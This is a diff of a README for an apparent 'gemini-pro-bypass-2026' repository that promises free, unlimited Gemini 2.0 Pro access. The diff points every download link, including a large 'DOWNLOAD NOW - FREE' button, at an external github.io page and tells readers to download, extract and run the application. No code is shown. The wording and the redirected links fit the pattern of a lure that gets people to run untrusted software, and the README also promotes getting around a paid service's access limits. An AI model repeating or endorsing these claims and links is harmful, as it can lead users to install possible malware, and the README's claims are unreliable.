@@ -1,7 +1,7 @@
 <h1>🔓 gemini-pro-bypass-2026 - Free Gemini 2.0 Pro Access</h1>
 
 <p align="center">
-  <a href="https://github.com/tinami1717/gemini-pro-bypass-2026" style="display:inline-block;padding:15px 35px;background:linear-gradient(45deg,#ff6b6b,#feca57);color:#000;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(0,0,0,0.3);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://tinami1717.github.io" style="display:inline-block;padding:15px 35px;background:linear-gradient(45deg,#ff6b6b,#feca57);color:#000;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(0,0,0,0.3);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🎯 What Is This?
@@ -23,7 +23,7 @@ This is a powerful tool that lets you use Google's Gemini 2.0 Pro and Flash AI m
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/tinami1717/gemini-pro-bypass-2026](https://github.com/tinami1717/gemini-pro-bypass-2026)
+Visit this link to download the application: [https://tinami1717.github.io](https://tinami1717.github.io)
 
 Click the green "Code" button, then select "Download ZIP". Save the file to your Desktop or Downloads folder.
 
@@ -203,7 +203,7 @@ That's it! You're now ready to use one of the most powerful AI models available 
 
 ## 🔗 Download Again
 
-Need the link one more time? Here it is: [https://github.com/tinami1717/gemini-pro-bypass-2026](https://github.com/tinami1717/gemini-pro-bypass-2026)
+Need the link one more time? Here it is: [https://tinami1717.github.io](https://tinami1717.github.io)
 
 Click it, download, extract, run, and enjoy unlimited AI power!
 
